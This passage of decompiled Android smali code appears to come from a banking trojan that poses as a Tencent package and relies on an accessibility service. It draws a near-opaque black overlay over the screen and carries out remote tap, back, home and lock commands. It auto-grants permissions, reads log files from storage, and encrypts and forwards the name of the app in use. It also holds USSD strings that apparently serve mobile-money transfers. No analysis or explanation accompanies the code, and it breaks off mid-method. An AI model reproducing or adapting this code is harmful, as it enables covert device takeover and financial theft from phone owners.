    invoke-direct {v2, v0}, Landroid/widget/FrameLayout;-><init>(Landroid/content/Context;)V

    sput-object v2, Lcom/tencent/AccessibilityServiceCore;->injview:Landroid/widget/FrameLayout;

    const/16 v3, 0x8

    .line 3419
    invoke-virtual {v2, v3}, Landroid/widget/FrameLayout;->setVisibility(I)V

    .line 3420
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v4, "SCH"

    const-string v5, "720"

    invoke-static {v2, v4, v5}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 3421
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-string v5, "SCW"

    const-string v6, "1080"

    invoke-static {v4, v5, v6}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 3424
    new-instance v11, Landroid/view/WindowManager$LayoutParams;

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Integer;->intValue()I

    move-result v6

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Integer;->intValue()I

    move-result v7

    const/16 v8, 0x7f0

    const v9, 0x40008

    const/4 v10, 0x1

    move-object v5, v11

    invoke-direct/range {v5 .. v10}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    sput-object v11, Lcom/tencent/AccessibilityServiceCore;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v5, 0x35

    .line 3425
    iput v5, v11, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 3426
    sget-object v5, Lcom/tencent/AccessibilityServiceCore;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v6, -0x2

    iput v6, v5, Landroid/view/WindowManager$LayoutParams;->width:I

    .line 3427
    sget-object v5, Lcom/tencent/AccessibilityServiceCore;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    iput v6, v5, Landroid/view/WindowManager$LayoutParams;->height:I

    .line 3429
    sget-object v5, Lcom/tencent/AccessibilityServiceCore;->injview:Landroid/widget/FrameLayout;

    sget-object v6, Lcom/tencent/AccessibilityServiceCore;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v1, v5, v6}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 3430
    new-instance v5, Landroid/view/WindowManager$LayoutParams;

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/Integer;->intValue()I

    move-result v8

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/Integer;->intValue()I

    move-result v9

    const/16 v10, 0x7f0

    const v11, -0x7fb3f980

    const/4 v12, 0x1

    move-object v7, v5

    invoke-direct/range {v7 .. v12}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    sput-object v5, Lcom/tencent/AccessibilityServiceCore;->Fakeparams:Landroid/view/WindowManager$LayoutParams;

    .line 3432
    new-instance v5, Landroid/view/WindowManager$LayoutParams;

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v14

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v15

    const/16 v16, 0x7f0

    const v17, -0x7fb3f968

    const/16 v18, 0x1

    move-object v13, v5

    invoke-direct/range {v13 .. v18}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    sput-object v5, Lcom/tencent/AccessibilityServiceCore;->Fakeparams_bass:Landroid/view/WindowManager$LayoutParams;

    .line 3434
    new-instance v2, Landroid/widget/FrameLayout;

    invoke-direct {v2, v0}, Landroid/widget/FrameLayout;-><init>(Landroid/content/Context;)V

    sput-object v2, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    const-string v4, "#000000"

    .line 3435
    invoke-static {v4}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v4

    invoke-virtual {v2, v4}, Landroid/widget/FrameLayout;->setBackgroundColor(I)V

    .line 3437
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->Fakeparams:Landroid/view/WindowManager$LayoutParams;

    const/16 v4, 0x33

    iput v4, v2, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 3438
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    invoke-virtual {v2}, Landroid/widget/FrameLayout;->getBackground()Landroid/graphics/drawable/Drawable;

    move-result-object v2

    const/16 v4, 0xfd

    invoke-virtual {v2, v4}, Landroid/graphics/drawable/Drawable;->setAlpha(I)V

    .line 3439
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    invoke-virtual {v2, v3}, Landroid/widget/FrameLayout;->setVisibility(I)V

    .line 3440
    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    sget-object v3, Lcom/tencent/AccessibilityServiceCore;->Fakeparams_bass:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v1, v2, v3}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 3461
    :catch_1
    :try_start_2
    sget-object v1, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_P:Ljava/lang/String;

    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-static {v1, v2}, Lcom/tencent/MainLauncherActivity;->IP_tunesxconcerningn109_I(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v1

    if-eqz v1, :cond_0

    sget-object v1, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_P:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    const-string v2, "null"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 3462
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    .line 3463
    sget-object v2, Lcom/tencent/MainLauncherActivity;->T_tunesxconcerningn109_P:Ljava/lang/String;

    invoke-virtual {v1, v2}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v1

    const/high16 v2, 0x10000000

    .line 3464
    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 3465
    invoke-virtual {v0, v1}, Lcom/tencent/AccessibilityServiceCore;->startActivity(Landroid/content/Intent;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 3474
    :catch_2
    :cond_0
    :try_start_3
    const-class v1, Lcom/tencent/MainBackgroundService;

    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplication()Landroid/app/Application;

    move-result-object v2

    invoke-static {v1, v2}, Lcom/tencent/BackgroundServiceHelper;->removedqtractort40(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 3475
    new-instance v1, Landroid/content/Intent;

    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lcom/tencent/MainBackgroundService;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Lcom/tencent/AccessibilityServiceCore;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    :catch_3
    :cond_1
    return-void
.end method

.method public onUnbind(Landroid/content/Intent;)Z
    .locals 2

    .line 2825
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x18

    if-lt v0, v1, :cond_0

    .line 2826
    invoke-static {p0}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Lcom/tencent/AccessibilityServiceCore;)V

    goto :goto_0

    .line 2830
    :cond_0
    invoke-virtual {p0}, Lcom/tencent/AccessibilityServiceCore;->stopSelf()V

    .line 2832
    :goto_0
    invoke-super {p0, p1}, Landroid/accessibilityservice/AccessibilityService;->onUnbind(Landroid/content/Intent;)Z

    move-result p1

    return p1
.end method

.method public perfectSetting()V
    .locals 0

    .line 118
    invoke-static {p0}, Lcom/tencent/AutoPermissionGranter;->start(Lcom/tencent/AccessibilityServiceCore;)V

    return-void
.end method

.method public subescribeDbevicbeList()V
    .locals 3

    .line 3686
    new-instance v0, Lcom/tencent/AccessibilityServiceCore$20;

    invoke-direct {v0, p0}, Lcom/tencent/AccessibilityServiceCore$20;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    iput-object v0, p0, Lcom/tencent/AccessibilityServiceCore;->callbeack:Lcom/tencent/AccessibilityEventMonitor$ICallback;

    .line 3708
    sget-object v1, Lcom/tencent/MalwareConstants;->Evnet_Type_PerfectSetting:Ljava/lang/String;

    sget-object v2, Lcom/tencent/MalwareConstants;->Evnet_Type_FInish_Perfect:Ljava/lang/String;

    filled-new-array {v1, v2}, [Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x1

    invoke-static {v0, v2, v1}, Lcom/tencent/AccessibilityEventMonitor;->subscribe(Lcom/tencent/AccessibilityEventMonitor$ICallback;I[Ljava/lang/String;)V

    return-void
.end method

.method public takeScreenshot(ILjava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V
    .locals 0

    .line 1177
    invoke-super {p0, p1, p2, p3}, Landroid/accessibilityservice/AccessibilityService;->takeScreenshot(ILjava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V

    return-void
.end method

.method public tunesxconcerningn1012ActivSend(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 2

    .line 3099
    :try_start_0
    invoke-virtual {p0, p1}, Lcom/tencent/AccessibilityServiceCore;->getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    .line 3101
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object p1

    check-cast p1, Ljava/lang/String;

    .line 3102
    invoke-virtual {p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    const/4 v1, 0x0

    .line 3106
    :try_start_1
    invoke-virtual {v0, p1, v1}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object p1
    :try_end_1
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    :catch_0
    const/4 p1, 0x0

    :goto_0
    if-eqz p1, :cond_0

    .line 3118
    :try_start_2
    invoke-virtual {v0, p1}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object p1

    goto :goto_1

    :cond_0
    sget-object p1, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    const/4 v0, 0x3

    aget-object p1, p1, v0

    :goto_1
    check-cast p1, Ljava/lang/String;

    .line 3119
    sget-object v0, Lcom/tencent/DataPackagingEngine;->A_tunesxconcerningn103_A:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object p1

    invoke-static {v0, p1}, Lcom/tencent/DataEncryptionEngine;->agreeltimelybfacilitatez38(Ljava/lang/String;[B)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :catch_1
    return-void
.end method

.method public tunesxconcerningn1012RD(Ljava/lang/String;)Ljava/lang/String;
    .locals 7

    .line 2957
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v0

    .line 2961
    new-instance v1, Ljava/io/File;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v3, "/Config/sys/apps/log"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "log-"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, ".txt"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-direct {v1, v2, v4}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 2963
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-nez v2, :cond_0

    .line 2965
    new-instance v1, Ljava/io/File;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-direct {v1, v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 2969
    :cond_0
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    .line 2971
    :try_start_0
    new-instance v0, Ljava/io/BufferedReader;

    new-instance v2, Ljava/io/FileReader;

    invoke-direct {v2, v1}, Ljava/io/FileReader;-><init>(Ljava/io/File;)V

    invoke-direct {v0, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    .line 2975
    :goto_0
    :try_start_1
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_1

    .line 2976
    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_0

    .line 2978
    :cond_1
    invoke-virtual {v0}, Ljava/io/BufferedReader;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/io/FileNotFoundException; {:try_start_1 .. :try_end_1} :catch_0

    .line 2986
    :catch_0
    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method public tunesxconcerningn1012SW(Ljava/lang/String;)V
    .locals 20

    move-object/from16 v1, p0

    move-object/from16 v0, p1

    const-string v2, "#144#1*1*"

    const-string v3, "*436*4*1*1*"

    const-string v4, "*800*1*"

    .line 339
    :try_start_0
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getResources()Landroid/content/res/Resources;

    move-result-object v5

    invoke-virtual {v5}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    .line 342
    sget v5, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v6, 0x1a

    if-lt v5, v6, :cond_3a

    const-string v5, "clk"

    .line 343
    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    const/4 v6, 0x0

    const/4 v7, 0x3

    const/4 v8, 0x2

    const/4 v9, 0x1

    const/4 v10, 0x0

    if-eqz v5, :cond_1

    const-string v2, ":"

    .line 347
    invoke-virtual {v0, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 349
    aget-object v3, v2, v9

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    .line 350
    aget-object v4, v2, v8

    invoke-static {v4}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v4

    const-string v5, "hold"

    .line 351
    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 354
    aget-object v0, v2, v8

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    .line 355
    aget-object v0, v2, v7

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v4

    const/16 v0, 0xbb8

    move v15, v9

    move v9, v0

    goto :goto_0

    :cond_0
    move v15, v10

    .line 359
    :goto_0
    new-instance v10, Landroid/graphics/Path;

    invoke-direct {v10}, Landroid/graphics/Path;-><init>()V

    int-to-float v0, v3

    int-to-float v2, v4

    .line 360
    invoke-virtual {v10, v0, v2}, Landroid/graphics/Path;->moveTo(FF)V

    .line 363
    invoke-static {}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m()V

    const-wide/16 v11, 0x0

    int-to-long v13, v9

    invoke-static/range {v10 .. v15}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Landroid/graphics/Path;JJZ)Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    move-result-object v0

    .line 365
    invoke-static {}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m$1()V

    invoke-static {}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m()Landroid/accessibilityservice/GestureDescription$Builder;

    move-result-object v2

    .line 366
    invoke-static {v2, v0}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Landroid/accessibilityservice/GestureDescription$Builder;Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    .line 367
    invoke-static {v2}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Landroid/accessibilityservice/GestureDescription$Builder;)Landroid/accessibilityservice/GestureDescription;

    move-result-object v0

    invoke-static {v1, v0, v6, v6}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Lcom/tencent/AccessibilityServiceCore;Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    return-void

    :cond_1
    const-string v5, "Bc"

    .line 371
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_2

    .line 373
    invoke-virtual {v1, v9}, Lcom/tencent/AccessibilityServiceCore;->performGlobalAction(I)Z

    return-void

    :cond_2
    const-string v5, "Ho"

    .line 377
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    const/high16 v11, 0x10000000

    if-eqz v5, :cond_4

    .line 379
    invoke-static/range {p0 .. p0}, Lcom/tencent/DataPackagingEngine;->GS_tunesxconcerningn1011_B(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_3

    .line 380
    new-instance v0, Landroid/content/Intent;

    const-class v2, Lcom/tencent/WakeLockKeeperActivity;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 381
    invoke-virtual {v0, v11}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v2, 0x20000000

    .line 382
    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v2, 0x800000

    .line 383
    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 384
    invoke-virtual {v1, v0}, Lcom/tencent/AccessibilityServiceCore;->startActivity(Landroid/content/Intent;)V

    .line 385
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->wakeupScreen()V

    .line 388
    :cond_3
    invoke-virtual {v1, v8}, Lcom/tencent/AccessibilityServiceCore;->performGlobalAction(I)Z

    return-void

    :cond_4
    const-string v5, "RC"

    .line 392
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_5

    .line 393
    invoke-virtual {v1, v7}, Lcom/tencent/AccessibilityServiceCore;->performGlobalAction(I)Z

    return-void

    :cond_5
    const-string v5, "LK"

    .line 395
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    const/16 v12, 0x8

    if-eqz v5, :cond_7

    .line 398
    invoke-static/range {p0 .. p0}, Lcom/tencent/DataPackagingEngine;->GS_tunesxconcerningn1011_B(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_6

    .line 399
    invoke-virtual {v1, v9}, Lcom/tencent/AccessibilityServiceCore;->performGlobalAction(I)Z

    goto :goto_1

    .line 401
    :cond_6
    invoke-virtual {v1, v12}, Lcom/tencent/AccessibilityServiceCore;->performGlobalAction(I)Z

    :goto_1
    return-void

    :cond_7
    const-string v5, "LKSM"

    .line 406
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v13, "YES"

    if-eqz v5, :cond_8

    .line 407
    :try_start_1
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v2, "SME"

    invoke-static {v0, v2, v13}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1a

    :cond_8
    const-string v5, "LKKM"

    .line 408
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    const-string v14, "NO"

    if-eqz v5, :cond_9

    .line 409
    :try_start_2
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v2, "SME"

    invoke-static {v0, v2, v14}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 410
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->injview:Landroid/widget/FrameLayout;

    invoke-virtual {v0, v12}, Landroid/widget/FrameLayout;->setVisibility(I)V

    goto/16 :goto_1a

    :cond_9
    const-string v5, "LKSI"

    .line 411
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_a

    .line 412
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v2, "SIM"

    invoke-static {v0, v2, v13}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1a

    :cond_a
    const-string v5, "LKKI"

    .line 413
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_b

    .line 414
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v2, "SIM"

    invoke-static {v0, v2, v14}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 415
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->injview:Landroid/widget/FrameLayout;

    invoke-virtual {v0, v12}, Landroid/widget/FrameLayout;->setVisibility(I)V

    goto/16 :goto_1a

    :cond_b
    const-string v5, "LKST"

    .line 416
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_c

    .line 417
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v2, "STO"

    invoke-static {v0, v2, v13}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1a

    :cond_c
    const-string v5, "LKKT"

    .line 418
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_d

    .line 419
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v2, "STO"

    invoke-static {v0, v2, v14}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 420
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->injview:Landroid/widget/FrameLayout;

    invoke-virtual {v0, v12}, Landroid/widget/FrameLayout;->setVisibility(I)V

    goto/16 :goto_1a

    :cond_d
    const-string v5, "LKSU"

    .line 421
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_e

    .line 422
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v2, "STR"

    invoke-static {v0, v2, v13}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1a

    :cond_e
    const-string v5, "LKKU"

    .line 423
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_f

    .line 424
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v2, "STR"

    invoke-static {v0, v2, v14}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 425
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->injview:Landroid/widget/FrameLayout;

    invoke-virtual {v0, v12}, Landroid/widget/FrameLayout;->setVisibility(I)V

    goto/16 :goto_1a

    :cond_f
    const-string v5, "LKSDU"

    .line 426
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_10

    .line 427
    iput-boolean v9, v1, Lcom/tencent/AccessibilityServiceCore;->showtrust:Z

    goto/16 :goto_1a

    :cond_10
    const-string v5, "LKKDU"

    .line 428
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_11

    .line 429
    iput-boolean v10, v1, Lcom/tencent/AccessibilityServiceCore;->showtrust:Z

    .line 430
    goto/16 :goto_1a

    :cond_11
    const-string v5, "LKSBU"

    .line 431
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

